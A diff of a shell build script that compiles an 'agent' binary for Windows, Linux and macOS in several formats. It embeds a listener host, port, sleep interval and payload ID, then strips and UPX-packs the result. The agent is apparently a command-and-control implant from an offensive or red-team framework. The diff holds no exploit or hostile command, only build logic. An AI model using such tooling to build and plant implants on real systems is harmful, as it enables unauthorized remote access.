@@ -154,69 +154,56 @@ echo "Created configuration for build-time embedding"
 
 echo "Building agent..."
 
-# Determine build command based on target
-if [ "$BUILD_TYPE" == "debug" ]; then
-    BUILD_FLAGS=""
-else
-    BUILD_FLAGS="--release"
-fi
+# Determine output extension and artifact name
+case "$FORMAT" in
+    windows_exe)
+        BINARY_EXT=".exe"
+        AGENT_OUT="agent.exe"
+        ;;
+    windows_dll)
+        BINARY_EXT=".dll"
+        AGENT_OUT="agent.dll"
+        ;;
+    linux_elf)
+        BINARY_EXT=""
+        AGENT_OUT="agent"
+        ;;
+    macos_dylib)
+        BINARY_EXT=".dylib"
+        AGENT_OUT="libagent.dylib"
+        ;;
+    linux_so)
+        BINARY_EXT=".so"
+        AGENT_OUT="libagent.so"
+        ;;
+    *)
+        # Default to Linux ELF
+        BINARY_EXT=""
+        AGENT_OUT="agent"
+        ;;
+esac
 
-# Set up cargo features based on format
+# Set cargo features only for DLL
 CARGO_FEATURES=""
 if [ "$FORMAT" == "windows_dll" ]; then
-    echo "Setting up for Windows DLL build with DLL feature enabled"
     CARGO_FEATURES="--features dll"
-    
-    # Create a .cargo/config.toml file to set the proper linker args for DLL
-    mkdir -p .cargo
-    cat > .cargo/config.toml << EOF
-[target.x86_64-pc-windows-gnu]
-rustflags = [
-    "-C", "link-args=-Wl,--export-all-symbols",
-    "-C", "prefer-dynamic"
-]
-EOF
-    echo "Created .cargo/config.toml for DLL linking"
-fi
-
-# Set default BINARY_EXT
-if [[ "$TARGET" == *windows* ]]; then
-    BINARY_EXT=".exe"
-else
-    BINARY_EXT=""
+    # .cargo/config.toml for DLL build (already handled above)
 fi
 
 # Build the agent
-echo "Building for $TARGET..."
+echo "Building for $TARGET ($FORMAT)..."
 if [[ "$TARGET" == *windows* ]]; then
-    # Windows build
     if command -v cross &> /dev/null; then
-        echo "Using cross for Windows build..."
-        if [ "$FORMAT" == "windows_dll" ]; then
-            echo "Building with DLL features: cross build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET"
-            LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
-            cross build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
-        else
-            LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
-            cross build $BUILD_FLAGS --target $TARGET
-        fi
+        LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
+        cross build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
     else
-        echo "Cross tool not found, using direct cargo build..."
-        # Make sure the Windows target is installed
         rustup target add $TARGET
-        if [ "$FORMAT" == "windows_dll" ]; then
-            echo "Building with DLL features: cargo build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET"
-            LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
-            cargo build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
-        else
-            LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
-            cargo build $BUILD_FLAGS --target $TARGET
-        fi
+        LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
+        cargo build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
     fi
 else
-    # Linux build
     LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
-    cargo build $BUILD_FLAGS --target $TARGET
+    cargo build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
 fi
 
 # Determine the build directory
@@ -234,144 +221,54 @@ else
     echo "Build directory $BUILD_DIR does not exist!" >&2
 fi
 
-# Copy the binary to the output directory (absolute path)
-if [ -f "$BUILD_DIR/agent$BINARY_EXT" ]; then
-    echo "Copying agent binary to output directory: $OUTPUT_DIR/agent$BINARY_EXT"
+# Copy the built artifact to the output directory
+if [ -f "$BUILD_DIR/$AGENT_OUT" ]; then
+    echo "Copying $AGENT_OUT to output directory: $OUTPUT_DIR/$AGENT_OUT"
     mkdir -p "$OUTPUT_DIR"
-    cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/agent$BINARY_EXT"
-    # Timestamped copy for reference
-    cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/$(date +%Y%m%d%H%M%S)_agent$BINARY_EXT"
+    cp "$BUILD_DIR/$AGENT_OUT" "$OUTPUT_DIR/$AGENT_OUT"
+    cp "$BUILD_DIR/$AGENT_OUT" "$OUTPUT_DIR/$(date +%Y%m%d%H%M%S)_$AGENT_OUT"
     echo "Agent binary copied successfully to specified output location"
 else
-    echo "ERROR: agent binary not found at $BUILD_DIR/agent$BINARY_EXT" >&2
+    echo "ERROR: agent binary not found at $BUILD_DIR/$AGENT_OUT" >&2
     echo "Contents of $BUILD_DIR:" >&2
     ls -la "$BUILD_DIR" >&2
+    exit 1
 fi
 
-echo "Build complete in $BUILD_DIR"
+# Copy config.json for agent
+mkdir -p "$OUTPUT_DIR/.config"
+cp "$OUTPUT_DIR/config.json" "$OUTPUT_DIR/.config/config.json"
 
-# Copy the binary to the output directory
-if [ -f "$BUILD_DIR/agent$BINARY_EXT" ]; then
-    echo "Copying agent binary to output directory: $OUTPUT_DIR/agent$BINARY_EXT"
-    cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/agent$BINARY_EXT"
-    
-    # We'll maintain the timestamped copy for reference
-    cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/$(date +%Y%m%d%H%M%S)_agent$BINARY_EXT"
-    
-    echo "Agent binary copied successfully to specified output location"
-    
-    # IMPORTANT: Copy config.json to a location relative to the agent binary
-    # This ensures the agent can find its config regardless of where it's run from
-    echo "Embedding config.json with agent binary"
-    # This special directory naming scheme will help the agent find its config
-    mkdir -p "$OUTPUT_DIR/.config"
-    cp "$OUTPUT_DIR/config.json" "$OUTPUT_DIR/.config/config.json"
-    
-    # IMPORTANT: Also copy the agent to the server's expected location
-    echo "Copying agent to server's expected location: $ORIGINAL_OUTPUT_DIR/agent$BINARY_EXT"
-    mkdir -p "$(dirname "$ORIGINAL_OUTPUT_DIR")"
-    cp "$BUILD_DIR/agent$BINARY_EXT" "$ORIGINAL_OUTPUT_DIR/agent$BINARY_EXT"
-    cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/config.json"
-    mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
-    cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/.config/config.json"
-else
-    echo "WARNING: agent binary not found at expected location: $BUILD_DIR/agent$BINARY_EXT"
-    # List directory contents to aid debugging
-    echo "Contents of $BUILD_DIR:"
-    ls -la "$BUILD_DIR"
-fi
+# Also copy to server's expected location
+mkdir -p "$(dirname "$ORIGINAL_OUTPUT_DIR")"
+cp "$BUILD_DIR/$AGENT_OUT" "$ORIGINAL_OUTPUT_DIR/$AGENT_OUT"
+cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/config.json"
+mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
+cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/.config/config.json"
 
-# After copying the binary, strip and compress with upx if available
-if [ -f "$OUTPUT_DIR/agent$BINARY_EXT" ]; then
+# Strip and compress if possible
+if [ -f "$OUTPUT_DIR/$AGENT_OUT" ]; then
     echo "Stripping binary..."
-    strip "$OUTPUT_DIR/agent$BINARY_EXT" || true
+    strip "$OUTPUT_DIR/$AGENT_OUT" || true
     if command -v upx &> /dev/null; then
         echo "Compressing binary with upx..."
-        upx --best --lzma "$OUTPUT_DIR/agent$BINARY_EXT"
+        upx --best --lzma "$OUTPUT_DIR/$AGENT_OUT"
     fi
 fi
 
-# For DLL format, we need to properly handle DLL creation
-if [ "$FORMAT" == "windows_dll" ]; then
-    echo "Creating Windows DLL..."
-    
-    # For Windows targets, handle DLL generation
-    if [[ "$TARGET" == *windows* ]]; then
-        # For Windows DLL, rename the binary if it doesn't have .dll extension
-        if [ -f "$BUILD_DIR/agent$BINARY_EXT" ]; then
-            # If using Rust's built-in DLL capability, the binary might already be a proper DLL
-            # We just need to rename it to have .dll extension
-            if [[ "$CARGO_FEATURES" == *dll* ]]; then
-                echo "Copying agent.dll to $OUTPUT_DIR"
-                cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/agent.dll"
-                
-                # Ensure the DLL is copied directly to the output directory to avoid path mismatch issues
-                echo "Successfully created DLL at: $OUTPUT_DIR/agent.dll"
-                
-                # Also copy the config for DLL usage
-                mkdir -p "$OUTPUT_DIR/.config"
-                cp "$OUTPUT_DIR/config.json" "$OUTPUT_DIR/.config/config.json"
-                
-                # Copy to server's expected location too
-                cp "$BUILD_DIR/agent$BINARY_EXT" "$ORIGINAL_OUTPUT_DIR/agent.dll"
-                mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
-                cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/.config/config.json"
-                
-                ls -la "$OUTPUT_DIR"
-            else
-                # Convert EXE to DLL using objcopy
-                if command -v objcopy &> /dev/null; then
-                    echo "Converting EXE to DLL using objcopy..."
-                    objcopy --input-target=pe-x86-64 --output-target=pe-x86-64 --add-section .rdata="$BUILD_DIR/agent$BINARY_EXT" "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/agent.dll"
-                    echo "Successfully created DLL at: $OUTPUT_DIR/agent.dll"
-                    
-                    # Also copy to server's expected location
-                    objcopy --input-target=pe-x86-64 --output-target=pe-x86-64 --add-section .rdata="$BUILD_DIR/agent$BINARY_EXT" "$BUILD_DIR/agent$BINARY_EXT" "$ORIGINAL_OUTPUT_DIR/agent.dll"
-                    
-                    # Also copy the config for DLL usage
-                    mkdir -p "$OUTPUT_DIR/.config"
-                    cp "$OUTPUT_DIR/config.json" "$OUTPUT_DIR/.config/config.json"
-                    mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
-                    cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/.config/config.json"
-                else
-                    echo "objcopy not found, copying executable as DLL..."
-                    cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/agent.dll"
-                    cp "$BUILD_DIR/agent$BINARY_EXT" "$ORIGINAL_OUTPUT_DIR/agent.dll"
-                    
-                    # Also copy the config for DLL usage
-                    mkdir -p "$OUTPUT_DIR/.config"
-                    cp "$OUTPUT_DIR/config.json" "$OUTPUT_DIR/.config/config.json"
-                    mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
-                    cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/.config/config.json"
-                fi
-            fi
-        else
-            echo "ERROR: Windows agent binary not found for DLL creation"
-            exit 1
-        fi
-    else
-        echo "ERROR: Cannot create Windows DLL for non-Windows target"
-        exit 1
-    fi
-fi
-
-# Ensure all files are in the correct location
+# Final output checks
 echo "Final output directory contents:"
 ls -la "$OUTPUT_DIR"
-
-# Show the contents of the server directory as well
 echo "Server directory contents:"
 ls -la "$ORIGINAL_OUTPUT_DIR"
 
-# If we built a DLL, verify it exists in the output directory
+# DLL check
 if [ "$FORMAT" == "windows_dll" ]; then
     if [ -f "$OUTPUT_DIR/agent.dll" ]; then
         echo "SUCCESS: agent.dll was found at $OUTPUT_DIR/agent.dll"
-        # Display file size to confirm it's a valid file
         stat -c "File size: %s bytes" "$OUTPUT_DIR/agent.dll"
     else
         echo "ERROR: agent.dll was not found in the output directory"
-        echo "This will cause the server to return 500 internal server error"
         exit 1
     fi
 fi
